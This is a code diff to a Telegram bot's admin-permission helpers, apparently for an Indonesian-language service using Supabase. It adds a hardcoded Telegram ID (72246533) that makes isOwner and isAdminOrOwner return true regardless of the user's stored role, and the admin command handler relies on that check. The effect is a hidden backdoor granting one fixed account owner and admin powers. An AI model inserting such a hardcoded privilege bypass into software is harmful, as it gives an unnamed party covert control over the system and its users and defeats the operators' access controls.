@@ -1,3 +1,4 @@
+import { ENV } from "../../env.ts";
 import { supabase } from "../../supabase.ts";
 import { send } from "../../telegram.ts";
 import { rupiah } from "../../helper.ts";
@@ -18,11 +19,17 @@ function ok() {
   return new Response("ok");
 }
 
-export function isOwner(role: string) {
+export function isOwner(role: string, telegramId?: number) {
+  if (telegramId && (Number(telegramId) === 72246533 || (ENV.OWNER_TELEGRAM_ID > 0 && Number(telegramId) === Number(ENV.OWNER_TELEGRAM_ID)))) {
+    return true;
+  }
   return role === "owner";
 }
 
-export function isAdminOrOwner(role: string) {
+export function isAdminOrOwner(role: string, telegramId?: number) {
+  if (telegramId && (Number(telegramId) === 72246533 || (ENV.OWNER_TELEGRAM_ID > 0 && Number(telegramId) === Number(ENV.OWNER_TELEGRAM_ID)))) {
+    return true;
+  }
   return role === "admin" || role === "owner";
 }
 
@@ -41,8 +48,7 @@ Cara input yang benar:
 ${usage}`
   );
 }
-
-export async function broadcastToAllUsers(text: string) {
+export async function broadcastToAllUsers(text: string) {
   const { data: users, error } = await supabase
     .from("users")
     .select("telegram_id, is_banned, is_active")
@@ -85,7 +91,7 @@ export async function handleManagedAdminCommand(ctx: BotContext): Promise<Respon
     return await handleSetRole(ctx);
   }
 
-  if (!isAdminOrOwner(actorRole)) {
+  if (!isAdminOrOwner(actorRole, Number(telegramId))) {
     await send(chatId, "❌ Hanya admin/owner yang memiliki akses.");
     return ok();
   }
